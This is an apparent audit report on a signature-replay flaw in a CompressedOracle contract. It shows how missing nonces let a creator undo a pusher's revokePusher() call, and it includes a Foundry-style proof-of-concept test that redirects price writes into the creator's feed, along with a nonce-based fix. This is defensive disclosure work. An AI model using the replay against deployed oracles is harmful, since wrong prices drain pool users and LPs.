### Title
`allowPushers` EIP-191 Signature Has No Nonce, Allowing Creator to Replay Pusher Consent After `revokePusher()` and Silently Redirect Price Writes Into Creator Namespace — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` signs pusher consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce and no used-signature tracking. The `_ensureDeadline` guard only checks `block.timestamp <= deadline`. Within the deadline window the creator can replay the identical signature an unlimited number of times. A pusher who calls `revokePusher()` to stop feeding the creator's namespace has the revocation silently undone in the next block. If the pusher bot then continues pushing prices (believing it is writing to its own namespace), every word lands in the creator's namespace instead, injecting wrong prices into feeds consumed by pools.

---

### Finding Description

`allowPushers` builds its signed hash as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only replay guard is `_ensureDeadline`, which resolves to:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

There is no per-pusher nonce, no `mapping(bytes32 => bool) usedSignatures`, and no state change that would invalidate the signature after first use. The code comment acknowledges the concern but misidentifies the fix:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

A **dated** signature with a future deadline has exactly the same replay property within the deadline window. `revokePusher()` only zeroes `namespaceRemapping[msg.sender]`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [4](#0-3) 

Nothing marks the original signature as consumed, so the creator can immediately call `allowPushers` again with the same `(deadline, pusher, sig)` tuple and restore `namespaceRemapping[pusher] = creator`.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So every subsequent push from the pusher bot — which believes it is writing to its own namespace — is silently attributed to the creator's namespace and overwrites the creator's live feed slots.

---

### Impact Explanation

The creator's feed slots receive price data the pusher intended for its own namespace. Because the pusher bot thinks it revoked, it may push prices for a different asset, a different scale, or simply stale data into the creator's slots. Those slots are read by `AnchoredPriceProvider` / `CompressedPriceProvider` and forwarded to pool swaps as the authoritative bid/ask. A pool executing a swap against a wrong price suffers direct loss of user principal or LP assets — matching the "bad-price execution" and "pool insolvency" impact gates.

---

### Likelihood Explanation

The replay requires only that the creator retains the original `(deadline, pusher, sig)` tuple and calls `allowPushers` again — a single permissionless transaction with no cost beyond gas. The deadline window is chosen by the creator at signing time and can be arbitrarily long (e.g., 30 days). Any pusher bot that calls `revokePusher()` and then resumes pushing without re-checking `namespaceRemapping[pusher]` on every push cycle is vulnerable. This is a realistic operational pattern for automated price-feed bots.

---

### Recommendation

Add a per-pusher nonce to the signed message and increment it on each successful `allowPushers` call, analogous to ERC-2612 permit:

```solidity
mapping(address => uint256) public pusherNonces;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusherNonces[pusher],   // <-- add nonce
        pusher, msg.sender
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonces[pusher]++;          // <-- consume nonce
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, record used signature hashes in a `mapping(bytes32 => bool) usedConsents` and revert on reuse. Either approach makes `revokePusher()` irrevocable: the old signature is consumed and the creator cannot re-establish the delegation without a fresh signature from the pusher.

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — no nonce, no used-sig check
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);           // succeeds
assertEq(oracle.namespaceRemapping(pusher), creator);   // delegation restored!

// 5. Pusher bot pushes prices thinking it writes to its own namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 wrongPrice = _packRaw(9_000_000, 4, 2); // wrong asset price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, wrongPrice, tsMs));
assertTrue(ok);

// Wrong price lands in CREATOR's namespace, not pusher's own
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertEq(data.price, U64x32.decode(uint32(wrongPrice >> 16))); // creator feed poisoned

IOffchainOracle.OracleData memory own = oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0));
assertEq(own.price, 0); // pusher's own namespace untouched
```
